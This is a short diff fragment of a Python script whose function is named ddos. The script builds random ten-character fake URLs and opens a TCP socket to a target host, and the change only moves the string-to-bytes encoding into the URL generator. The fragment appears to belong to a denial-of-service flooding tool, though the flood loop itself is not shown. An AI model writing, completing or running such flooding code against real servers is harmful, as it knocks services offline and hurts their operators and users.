@@ -29,12 +29,12 @@ byteHostName = ipAddr.encode('utf-8','ignore')#convert string > bytes
 def fake_url():
     charPool = str(string.ascii_letters + string.digits + string.punctuation)
     url = "".join(random.sample(charPool,10))
+    url = url.encode('utf-8','ignore')#convert string>bytes
     return url
 
 
 def ddos():
-    url = fake_url()
-    byte_url = url.encode('utf-8','ignore')#convert string>bytes
+    byte_url = fake_url()
 
     connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #https://docs.python.org/3/library/socket.html 
 
